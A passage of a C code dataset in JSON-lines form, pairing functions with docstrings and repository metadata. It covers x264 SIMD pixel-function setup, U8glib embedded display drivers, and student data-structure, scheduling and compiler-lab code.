HAVE_ARMV6\n    if( cpu&X264_CPU_ARMV6 )\n    {\n        pixf->sad[PIXEL_4x8] = x264_pixel_sad_4x8_armv6;\n        pixf->sad[PIXEL_4x4] = x264_pixel_sad_4x4_armv6;\n        pixf->sad_aligned[PIXEL_4x8] = x264_pixel_sad_4x8_armv6;\n        pixf->sad_aligned[PIXEL_4x4] = x264_pixel_sad_4x4_armv6;\n    }\n    if( cpu&X264_CPU_NEON )\n    {\n        INIT5( sad, _neon );\n        INIT5( sad_aligned, _neon );\n        INIT7( sad_x3, _neon );\n        INIT7( sad_x4, _neon );\n        INIT7( ssd, _neon );\n        INIT7( satd, _neon );\n        INIT7( satd_x3, _neon );\n        INIT7( satd_x4, _neon );\n        INIT4( hadamard_ac, _neon );\n        pixf->sa8d[PIXEL_8x8]   = x264_pixel_sa8d_8x8_neon;\n        pixf->sa8d[PIXEL_16x16] = x264_pixel_sa8d_16x16_neon;\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_neon;\n        pixf->var[PIXEL_8x8]    = x264_pixel_var_8x8_neon;\n        pixf->var[PIXEL_8x16]   = x264_pixel_var_8x16_neon;\n        pixf->var[PIXEL_16x16]  = x264_pixel_var_16x16_neon;\n        pixf->var2[PIXEL_8x8]   = x264_pixel_var2_8x8_neon;\n        pixf->var2[PIXEL_8x16]  = x264_pixel_var2_8x16_neon;\n        pixf->vsad = x264_pixel_vsad_neon;\n        pixf->asd8 = x264_pixel_asd8_neon;\n\n        pixf->intra_sad_x3_4x4    = x264_intra_sad_x3_4x4_neon;\n        pixf->intra_satd_x3_4x4   = x264_intra_satd_x3_4x4_neon;\n        pixf->intra_sad_x3_8x8    = x264_intra_sad_x3_8x8_neon;\n        pixf->intra_sa8d_x3_8x8   = x264_intra_sa8d_x3_8x8_neon;\n        pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c_neon;\n        pixf->intra_satd_x3_8x8c  = x264_intra_satd_x3_8x8c_neon;\n        pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c_neon;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_neon;\n        pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16_neon;\n        pixf->intra_satd_x3_16x16 = x264_intra_satd_x3_16x16_neon;\n\n        pixf->ssd_nv12_core     = x264_pixel_ssd_nv12_core_neon;\n        pixf->ssim_4x4x2_core   = x264_pixel_ssim_4x4x2_core_neon;\n        pixf->ssim_end4         = x264_pixel_ssim_end4_neon;\n\n        if( cpu&X264_CPU_FAST_NEON_MRC )\n        {\n            pixf->sad[PIXEL_4x8] = x264_pixel_sad_4x8_neon;\n            pixf->sad[PIXEL_4x4] = x264_pixel_sad_4x4_neon;\n            pixf->sad_aligned[PIXEL_4x8] = x264_pixel_sad_aligned_4x8_neon;\n            pixf->sad_aligned[PIXEL_4x4] = x264_pixel_sad_aligned_4x4_neon;\n        }\n        else    // really just scheduled for dual issue / A8\n        {\n            INIT5( sad_aligned, _neon_dual );\n        }\n    }\n#endif\n\n#if ARCH_AARCH64\n    if( cpu&X264_CPU_NEON )\n    {\n        INIT8( sad, _neon );\n        // AArch64 has no distinct instructions for aligned load/store\n        INIT8_NAME( sad_aligned, sad, _neon );\n        INIT7( sad_x3, _neon );\n        INIT7( sad_x4, _neon );\n        INIT8( ssd, _neon );\n        INIT8( satd, _neon );\n        INIT7( satd_x3, _neon );\n        INIT7( satd_x4, _neon );\n        INIT4( hadamard_ac, _neon );\n\n        pixf->sa8d[PIXEL_8x8]   = x264_pixel_sa8d_8x8_neon;\n        pixf->sa8d[PIXEL_16x16] = x264_pixel_sa8d_16x16_neon;\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_neon;\n\n        pixf->var[PIXEL_8x8]    = x264_pixel_var_8x8_neon;\n        pixf->var[PIXEL_8x16]   = x264_pixel_var_8x16_neon;\n        pixf->var[PIXEL_16x16]  = x264_pixel_var_16x16_neon;\n        pixf->var2[PIXEL_8x8]   = x264_pixel_var2_8x8_neon;\n        pixf->var2[PIXEL_8x16]  = x264_pixel_var2_8x16_neon;\n        pixf->vsad = x264_pixel_vsad_neon;\n        pixf->asd8 = x264_pixel_asd8_neon;\n\n        pixf->intra_sad_x3_4x4    = x264_intra_sad_x3_4x4_neon;\n        pixf->intra_satd_x3_4x4   = x264_intra_satd_x3_4x4_neon;\n        pixf->intra_sad_x3_8x8    = x264_intra_sad_x3_8x8_neon;\n        pixf->intra_sa8d_x3_8x8   = x264_intra_sa8d_x3_8x8_neon;\n        pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c_neon;\n        pixf->intra_satd_x3_8x8c  = x264_intra_satd_x3_8x8c_neon;\n        pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c_neon;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_neon;\n        pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16_neon;\n        pixf->intra_satd_x3_16x16 = x264_intra_satd_x3_16x16_neon;\n\n        pixf->ssd_nv12_core     = x264_pixel_ssd_nv12_core_neon;\n        pixf->ssim_4x4x2_core   = x264_pixel_ssim_4x4x2_core_neon;\n        pixf->ssim_end4         = x264_pixel_ssim_end4_neon;\n    }\n#endif // ARCH_AARCH64\n\n#if HAVE_MSA\n    if( cpu&X264_CPU_MSA )\n    {\n        INIT8( sad, _msa );\n        INIT8_NAME( sad_aligned, sad, _msa );\n        INIT8( ssd, _msa );\n        INIT7( sad_x3, _msa );\n        INIT7( sad_x4, _msa );\n        INIT8( satd, _msa );\n        INIT4( hadamard_ac, _msa );\n\n        pixf->intra_sad_x3_4x4   = x264_intra_sad_x3_4x4_msa;\n        pixf->intra_sad_x3_8x8   = x264_intra_sad_x3_8x8_msa;\n        pixf->intra_sad_x3_8x8c  = x264_intra_sad_x3_8x8c_msa;\n        pixf->intra_sad_x3_16x16 = x264_intra_sad_x3_16x16_msa;\n        pixf->intra_satd_x3_4x4   = x264_intra_satd_x3_4x4_msa;\n        pixf->intra_satd_x3_16x16 = x264_intra_satd_x3_16x16_msa;\n        pixf->intra_satd_x3_8x8c  = x264_intra_satd_x3_8x8c_msa;\n        pixf->intra_sa8d_x3_8x8   = x264_intra_sa8d_x3_8x8_msa;\n\n        pixf->ssim_4x4x2_core = x264_ssim_4x4x2_core_msa;\n\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_msa;\n        pixf->var[PIXEL_8x16]  = x264_pixel_var_8x16_msa;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_msa;\n        pixf->var2[PIXEL_8x16]  = x264_pixel_var2_8x16_msa;\n        pixf->var2[PIXEL_8x8]   = x264_pixel_var2_8x8_msa;\n        pixf->sa8d[PIXEL_16x16] = x264_pixel_sa8d_16x16;\n        pixf->sa8d[PIXEL_8x8]   = x264_pixel_sa8d_8x8;\n    }\n#endif // HAVE_MSA\n\n#endif // HIGH_BIT_DEPTH\n#if HAVE_ALTIVEC\n    if( cpu&X264_CPU_ALTIVEC )\n    {\n        x264_pixel_altivec_init( pixf );\n    }\n#endif\n\n    pixf->ads[PIXEL_8x16] =\n    pixf->ads[PIXEL_8x4] =\n    pixf->ads[PIXEL_4x8] = pixf->ads[PIXEL_16x8];\n    pixf->ads[PIXEL_4x4] = pixf->ads[PIXEL_8x8];\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\pixel.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/*====================================================================*/\n", "func_signal": "void u8g_UpdateDimension(u8g_t *u8g)", "code": "{\n  u8g->width = u8g_GetWidthLL(u8g, u8g->dev);\n  u8g->height = u8g_GetHeightLL(u8g, u8g->dev);\n  u8g->mode = u8g_GetModeLL(u8g, u8g->dev);\n  /* 9 Dec 2012: u8g_scale.c requires update of current page */\n  u8g_call_dev_fn(u8g, u8g->dev, U8G_DEV_MSG_GET_PAGE_BOX, &(u8g->current_page));\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_ll_api.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* v = value, d = number of digits */\n", "func_signal": "const char *u8g_u8toa(uint8_t v, uint8_t d)", "code": "{\n  static char buf[4];\n  d = 3-d;\n  return u8g_u8toap(buf, v) + d;\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_u8toa.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/*\n  idx: index for the palette entry (0..255)\n  r: value for red (0..255)\n  g: value for green (0..255)\n  b: value for blue (0..255)\n*/\n", "func_signal": "void u8g_SetColorEntry(u8g_t *u8g, uint8_t idx, uint8_t r, uint8_t g, uint8_t b)", "code": "{\n  u8g_dev_arg_irgb_t irgb;\n  irgb.idx = idx;\n  irgb.r = r;\n  irgb.g = g;\n  irgb.b = b;  \n  u8g_call_dev_fn(u8g, u8g->dev, U8G_DEV_MSG_SET_COLOR_ENTRY, &irgb);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_ll_api.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* v = value, d = number of digits */\n", "func_signal": "const char *u8g_u16toa(uint16_t v, uint8_t d)", "code": "{\n  static char buf[6];\n  d = 5-d;\n  return u8g_u16toap(buf, v) + d;\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_u16toa.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* limitation: total buffer must not exceed 256 bytes */\n", "func_signal": "void u8g_pb8h1_set_pixel(u8g_pb_t *b, u8g_uint_t x, u8g_uint_t y, uint8_t color_index)", "code": "{\n#ifdef NEW_CODE\n  struct u8g_pb_h1_struct s;\n  u8g_pb8h1_state_init(&s, b, x, y);\n  u8g_pb8h1_state_set_pixel(&s, color_index);\n\n//  u8g_pb8h1_state_up(&s);\n//  if ( s.y > b->p.page_y1 )\n//    return;\n//  if ( s.x > b->width )\n//    return;\n//  u8g_pb8h1_state_set_pixel(&s, color_index);\n#else\n  register uint8_t mask;\n  u8g_uint_t tmp;\n  uint8_t *ptr = b->buf;\n  \n  y -= b->p.page_y0;\n  tmp = b->width;\n  tmp >>= 3;\n  tmp *= (uint8_t)y;\n  ptr += tmp;\n  \n  mask = 0x080;\n  mask >>= x & 7;\n  x >>= 3;\n  ptr += x;\n  if ( color_index )\n  {\n    *ptr |= mask;\n  }\n  else\n  {\n    mask ^=0xff;\n    *ptr &= mask;\n  }\n#endif\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_pb8h1.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* special init for pure ARM systems */\n", "func_signal": "uint8_t u8g_InitComFn(u8g_t *u8g, u8g_dev_t *dev, u8g_com_fnptr com_fn)", "code": "{\n  u8g_init_data(u8g);\n  \n#if defined(U8G_WITH_PINLIST)  \n  {\n    uint8_t i;\n    for( i = 0; i < U8G_PIN_LIST_LEN; i++ )\n      u8g->pin_list[i] = U8G_PIN_DUMMY;\n  }\n#endif\n  \n  u8g->dev = dev;\n  \n  /* replace the device procedure with a custom communication procedure */\n  u8g->dev->com_fn = com_fn;\n  \n  /* On the Arduino Environment this will lead to two calls to u8g_Begin(), the following line will be called first (by U8glib constructors) */\n  /* if - in future releases - this is removed, then still call u8g_UpdateDimension() */\n  /* if Arduino call u8g_UpdateDimension else u8g_Begin */\n  /* issue 146 */\n  return u8g_Begin(u8g);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_ll_api.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* Obsolete, usually set by the init of the structure */\n", "func_signal": "void u8g_pb14v1_Init(u8g_pb_t *b, void *buf, u8g_uint_t width)", "code": "{\n  b->buf = buf;\n  b->width = width;\n  u8g_pb14v1_Clear(b);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_pb14v1.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "//static uint8_t u8g_is_intersection_decision_tree(u8g_uint_t a0, u8g_uint_t a1, u8g_uint_t v0, u8g_uint_t v1) U8G_ALWAYS_INLINE;\n", "func_signal": "static uint8_t U8G_ALWAYS_INLINE u8g_is_intersection_decision_tree(u8g_uint_t a0, u8g_uint_t a1, u8g_uint_t v0, u8g_uint_t v1)", "code": "{\n  /* surprisingly the macro leads to larger code */\n  /* return U8G_IS_INTERSECTION_MACRO(a0,a1,v0,v1); */\n  if ( v0 <= a1 )\n  {\n    if ( v1 >= a0 )\n    {\n      return 1;\n    }\n    else\n    {\n      if ( v0 > v1 )\n      {\n\treturn 1;\n      }\n      else\n      {\n\treturn 0;\n      }\n    }\n  }\n  else\n  {\n    if ( v1 >= a0 )\n    {\n      if ( v0 > v1 )\n      {\n\treturn 1;\n      }\n      else\n      {\n\treturn 0;\n      }\n    }\n    else\n    {\n      return 0;\n    }\n  }\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_clip.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* ARDUINO */\n", "func_signal": "uint8_t u8g_dev_ht1632_24x16_fn(u8g_t *u8g, u8g_dev_t *dev, uint8_t msg, void *arg)", "code": "{\n  switch(msg)\n  {\n    case U8G_DEV_MSG_INIT:\n      ht1632_init(u8g);\n      break;\n    case U8G_DEV_MSG_STOP:\n      break;\n    case U8G_DEV_MSG_PAGE_NEXT:\n      {\n\tu8g_pb_t *pb = (u8g_pb_t *)(dev->dev_mem);\n       \n\t/* current page: pb->p.page */\n\t/* ptr to the buffer: pb->buf */\n\tht1632_transfer_data(u8g, pb->p.page, WIDTH, pb->buf);\n      }\n      break;\n    case U8G_DEV_MSG_CONTRAST:\n      /* values passed to SetContrast() are between 0 and 255, scale down to 0...15 */\n      ht1632_set_contrast(u8g, (*(uint8_t *)arg) >> 4);\n    return 1;\n  }\n  return u8g_dev_pb16v1_base_fn(u8g, dev, msg, arg);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_dev_ht1632.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/*\n\n  PIN_D0 8\n  PIN_D1 9\n  PIN_D2 10\n  PIN_D3 11\n  PIN_D4 4\n  PIN_D5 5\n  PIN_D6 6\n  PIN_D7 7\n\n  PIN_CS 14\n  PIN_A0 15\n  PIN_RESET 16\n  PIN_WR 17\n  PIN_RD 18\n  \n  u8g_InitRW8Bit(u8g, dev, d0, d1, d2, d3, d4, d5, d6, d7, cs, a0, wr, rd, reset)\n  u8g_InitRW8Bit(u8g, dev,  8,  9, 10, 11,  4,  5,  6,  7, 14, 15, 17, 18, 16)\n\n*/\n", "func_signal": "uint8_t u8g_InitRW8Bit(u8g_t *u8g, u8g_dev_t *dev, uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3, uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7, \n  uint8_t cs, uint8_t a0, uint8_t wr, uint8_t rd, uint8_t reset)", "code": "{\n  \n  /* fill data structure with some suitable values */\n  u8g_init_data(u8g);\n  u8g->dev = dev;\n    \n  /* assign user pins */\n\n  u8g->pin_list[U8G_PI_D0] = d0;\n  u8g->pin_list[U8G_PI_D1] = d1;\n  u8g->pin_list[U8G_PI_D2] = d2;\n  u8g->pin_list[U8G_PI_D3] = d3;\n  u8g->pin_list[U8G_PI_D4] = d4;\n  u8g->pin_list[U8G_PI_D5] = d5;\n  u8g->pin_list[U8G_PI_D6] = d6;\n  u8g->pin_list[U8G_PI_D7] = d7;\n\n  u8g->pin_list[U8G_PI_CS] = cs;\n  u8g->pin_list[U8G_PI_A0] = a0;\n  u8g->pin_list[U8G_PI_WR] = wr;\n  u8g->pin_list[U8G_PI_RD] = rd;\n  u8g->pin_list[U8G_PI_RESET] = reset;\n  \n  return u8g_Begin(u8g);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_ll_api.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* limitation: total buffer must not exceed 256 bytes, 20 nov 2012: extended to >256 bytes */\n", "func_signal": "void u8g_pb8h1f_set_pixel(u8g_pb_t *b, u8g_uint_t x, u8g_uint_t y, uint8_t color_index)", "code": "{\n  /*register uint8_t mask, tmp;*/\n  register uint8_t mask; \n  register u8g_uint_t tmp;\n  uint8_t *ptr = b->buf;\n  \n  y -= b->p.page_y0;\n  tmp = b->width >> 3;\n  tmp *= (uint8_t)y;\n  ptr += tmp;\n  \n  mask = 1;\n  mask <<= x & 7;\n  x >>= 3;\n  ptr += x;\n  if ( color_index )\n  {\n    *ptr |= mask;\n  }\n  else\n  {\n    mask ^=0xff;\n    *ptr &= mask;\n  }\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_pb8h1f.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* value is between 0...15 */\n", "func_signal": "void ht1632_set_contrast(u8g_t *u8g, uint8_t value)", "code": "{\n  uint8_t cs_pin = u8g->pin_list[U8G_PI_CS];\n  digitalWrite(cs_pin, LOW);\n  ht1632_write_data_MSB(u8g, 3, HT1632_ID_CMD, false);\n  ht1632_write_data_MSB(u8g, 8, HT1632_CMD_PWM + value, false);\n  digitalWrite(cs_pin, HIGH);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_dev_ht1632.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/*\n  page: 0=data contain lines 0..16, 1=data contain lines 16..32  (a 24x16 display will only have page 0)\n  cnt: width of the display\n  data: pointer to a buffer with 2*cnt bytes.\n*/\n", "func_signal": "void ht1632_transfer_data(u8g_t *u8g, uint8_t page, uint8_t cnt, uint8_t *data)", "code": "{\n  uint8_t addr;\n  uint8_t cs_pin = u8g->pin_list[U8G_PI_CS];\n  /* send data to the ht1632 */\n  digitalWrite(cs_pin, LOW);\n  ht1632_write_data_MSB(u8g, 3, HT1632_ID_WR, false); // Send \"write to display\" command\n  ht1632_write_data_MSB(u8g, 7, page*2*cnt, false); \n  \n  // Operating in progressive addressing mode\n  for (addr = 0; addr < cnt; addr++)\n  {\n    ht1632_write_data(u8g, 8, data[addr]);  \n    ht1632_write_data(u8g, 8, data[addr+cnt]);\n  }  \n  digitalWrite(cs_pin, HIGH);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_dev_ht1632.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/*=========================================================================*/\n", "func_signal": "static void u8g_DrawHXBM(u8g_t *u8g, u8g_uint_t x, u8g_uint_t y, u8g_uint_t w, const uint8_t *bitmap)", "code": "{\n  uint8_t d;\n  x+=7;\n  while( w >= 8 )\n  {\n    u8g_Draw8Pixel(u8g, x, y, 2, *bitmap);\n    bitmap++;\n    w-= 8;\n    x+=8;\n  }\n  if ( w > 0 )\n  {\n    d = *bitmap;\n    x -= 7;\n    do\n    {\n      if ( d & 1 )\n        u8g_DrawPixel(u8g, x, y);\n      x++;\n      w--;\n      d >>= 1;      \n    } while ( w > 0 );\n  }\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_bitmap.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* convert the internal RGB 332 to 65K high byte */\n", "func_signal": "static uint8_t u8g_dev_ili9325d_get_65K_low_byte(uint8_t color)", "code": "{\n  uint8_t l;\n  l = color;\n  l <<= 3;\n  color &= 3;\n  color <<= 1;\n  l |= color;\n  return l;  \n}", "path": "libraries\\U8glib\\src\\clib\\u8g_dev_ili9325d_320x240.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/*====================================================================*/\n", "func_signal": "uint8_t u8g_InitLL(u8g_t *u8g, u8g_dev_t *dev)", "code": "{\n  uint8_t r;\n  u8g->state_cb(U8G_STATE_MSG_BACKUP_ENV);\n  r =  u8g_call_dev_fn(u8g, dev, U8G_DEV_MSG_INIT, NULL);\n  u8g->state_cb(U8G_STATE_MSG_BACKUP_U8G);\n  u8g->state_cb(U8G_STATE_MSG_RESTORE_ENV);\n  return r;\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_ll_api.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* assumes row autoincrement and activated nibble remap */\n", "func_signal": "static  void u8g_dev_ssd1325_2bit_write_4_pixel(u8g_t *u8g, u8g_dev_t *dev, uint8_t left, uint8_t right)", "code": "{\n  uint8_t d, tmp, cnt;\n  cnt = 4;\n  do    \n  {\n    d = left;\n    d &= 3;\n    d <<= 4;    \n    tmp = right;    \n    tmp &= 3;\n    d |= tmp;\n    d <<= 2;\n    u8g_WriteByte(u8g, dev, d);\n    left >>= 2;\n    right >>= 2;\n    cnt--;\n  }while ( cnt > 0 );\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_dev_ssd1325_nhd27oled_gr.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "// D2, pin 7  Universal Serial Interface clock\n", "func_signal": "uint8_t u8g_arduino_ATtiny85_spi_out(uint8_t val)", "code": "{\n  USIDR = val;  // byte to output\n  USISR = _BV (USIOIF);  // clear Counter Overflow Interrupt Flag, set count to zero \n  do\n  {\n    USICR = _BV (USIWM0)   // 3-wire mode\n          | _BV (USICS1) | _BV (USICLK)  // Software clock strobe\n          | _BV (USITC);   // Toggle Clock Port Pin\n  }\n  while ((USISR & _BV (USIOIF)) == 0);  // until Counter Overflow Interrupt Flag set\n  \n  return USIDR;  // return read data\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_com_arduino_attiny85_hw_spi.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* convert the internal RGB 332 to 65K high byte */\n", "func_signal": "static uint8_t u8g_dev_ili9325d_get_65K_high_byte(uint8_t color)", "code": "{\n  uint8_t h;\n  h = color;\n  h &= 0x0e0;\n  h |= h>>3;\n  h &= 0x0f8;\n  color>>=2;\n  color &= 7;\n  h |= color;\n  return h;  \n}", "path": "libraries\\U8glib\\src\\clib\\u8g_dev_ili9325d_320x240.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "/* Obsolete, usually set by the init of the structure */\n", "func_signal": "void u8g_pb8v1_Init(u8g_pb_t *b, void *buf, u8g_uint_t width)", "code": "{\n  b->buf = buf;\n  b->width = width;\n  u8g_pb_Clear(b);\n}", "path": "libraries\\U8glib\\src\\clib\\u8g_pb8v1.c", "repo_name": "esp8266/Basic", "stars": 247, "license": "None", "language": "c", "size": 247886}
{"docstring": "// A utility function to create a stack of given size\n", "func_signal": "struct Stack* createStack(int size)", "code": "{\n    struct Stack* stack = (struct Stack*) malloc(sizeof(struct Stack));\n    stack->size = size;\n    stack->top = -1;\n    stack->array = (struct Node**) malloc(stack->size * sizeof(struct Node*));\n    return stack;\n}", "path": "DS Lab\\DS Lab programs by week\\Week 11\\PostorderIter1stack.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Sort process wrt system and user processes, then priorities (higher is better); clashes resolved using FCFS\n", "func_signal": "void sort ()", "code": "{\n\tint i;\n\tfor (i = 1; i < n; ++i) {\n\t\tint j = i - 1;\n\t\tDATA_p_t temp = datas[i];\n\t\twhile (j >= 0 && datas[j]->pr < temp->pr) { // priority sort first\n\t\t\tdatas[j+1] = datas[j];\n\t\t\tj--;\n\t\t}\n\t\tdatas[j+1] = temp;\n\t}\n\tfor (i = 1; i < n; ++i) {\n\t\tint j = i - 1;\n\t\tDATA_p_t temp = datas[i];\n\t\twhile (j >= 0 && datas[j]->su > temp->su) { // system user sort after that\n\t\t\tdatas[j+1] = datas[j];\n\t\t\tj--;\n\t\t}\n\t\tdatas[j+1] = temp;\n\t}\n}", "path": "OS Lab\\CPU Scheduling\\priority\\mqpriority.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// -------------------------\n", "func_signal": "void E ()", "code": "{\n\tT();\n\tE1();\n\tif (strcmp(input[i], \"$\") == 0) {\n\t\tSUCCESS_HANDLER;\n\t} else {\n\t\tERROR_HANDLER;\n\t}\n}", "path": "CD Lab\\Simple parsers\\two.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Queue methods\n", "func_signal": "void createQueue (CQUEUE_p_t queue)", "code": "{\n\tprintf(\"\\n\\tEnter size of the circular queue: \");\n\tscanf(\"%d\", &queue->maxSize);\n\tqueue->arr = (int *)calloc(queue->maxSize, sizeof(int));\n\tqueue->capacity = 0;\n\tqueue->rear = -1;\n\tqueue->front = -1;\n}", "path": "DS Lab\\Queue\\CQExpand.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "/**\n*\tremove_directives (char *)\n*\tinput: <filename>\n*\toutput: file named \"pr_<filename>\" with preprocessor directives and comments removed.\n*/\n", "func_signal": "char *remove_directives (char *inname)", "code": "{\n\n\tFILE *input = fopen(inname, \"r\");\n\n\tchar *outname = (char *)malloc(128 * sizeof(char));\n\tsnprintf(outname, 128, \"pr_%s\", inname);\n\n\tFILE *output = fopen(outname, \"w+\");\n\n\tchar ch;\n\tdo {\n\t\tch = getc(input); // Get character from input file.\n\n\t\tif (ch == '#') { // If a #if found, loop till you find the next '\\n'\n\t\t\t\n\t\t\tch = getc(input);\n\t\t\tif (ch == 'i' || ch == 'd' || ch == 'u' || ch == 'p') {\n\t\t\t\twhile (ch != '\\n') { \n\t\t\t\t\tch = getc(input);\n\t\t\t\t}\n\t\t\t\t// ch = getc(input); // If you want to delete the line too\n\t\t\t\tungetc(ch, input);\n\t\t\t} else {\n\t\t\t\tputc('#', output);\n\t\t\t\t// putc(ch, output);\n\t\t\t}\n\n\t\t} else if (ch == '/') {\n\n\t\t\tch = getc(input);\n\n\t\t\tif (ch == '/') { // Single line comments remove till the line ends.\n\t\t\t\twhile (ch != '\\n') {\n\t\t\t\t\tch = getc(input);\n\t\t\t\t}\n\n\t\t\t} else if (ch == '*') { // Multi line comments, remove till '*/' comes.\n\n\t\t\t\tdo {\n\t\t\t\t\tch = getc(input);\n\n\t\t\t\t\tif (ch == '*') {\n\t\t\t\t\t\tch = getc(input);\n\t\t\t\t\t\tif (ch == '/') {\n\t\t\t\t\t\t\tch = getc(input);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t} while (YES);\n\n\t\t\t} else {\n\t\t\t\tputc('/', output);\n\t\t\t}\n\t\t}\n\n\t\tputc(ch, output);\n\n\t} while (ch != EOF);\n\n\tfclose(input);\n\tfclose(output);\n\n\treturn outname;\n\n}", "path": "CD Lab\\C like Parser 2\\src\\preprocessor.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Finds a symbol table entry by its name, inserts it otherwise\n", "func_signal": "st_node_p_t find_or_insert_st (st_node_p_t *head, st_entry_t entry, BOOL *inserted)", "code": "{\n\tif (*head == NULL) {\n\t\t*head = init_st_node(entry);\n\t\t(*head)->entry.id = 1;\n\t\t*inserted = YES;\n\t\treturn *head; // Only one node, currently inserted.\n\t}\n\tint id = 1;\n\tst_node_p_t temp = *head;\n\twhile (temp->next != NULL) {\n\t\tif (strcmp(temp->entry.name, entry.name) == 0 /*&& temp->entry.scope == entry.scope*/) {\n\t\t\t*inserted = NO;\n\t\t\treturn temp;\n\t\t}\n\t\ttemp = temp->next;\n\t\tid = temp->entry.id;\n\t}\n\tif (strcmp(temp->entry.name, entry.name) == 0 /*&& temp->entry.scope == entry.scope*/) {\n\t\t*inserted = NO;\n\t\treturn temp;\n\t}\n\tif (id > 0) {\n\t\ttemp->next = init_st_node(entry);\n\t\ttemp->next->entry.id = id + 1;\n\t\t*inserted = YES;\n\t\treturn temp->next;\n\t} else {\n\t\t*inserted = NO;\n\t\treturn NULL;\n\t}\n}", "path": "CD Lab\\C like Parser 3\\src\\util.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
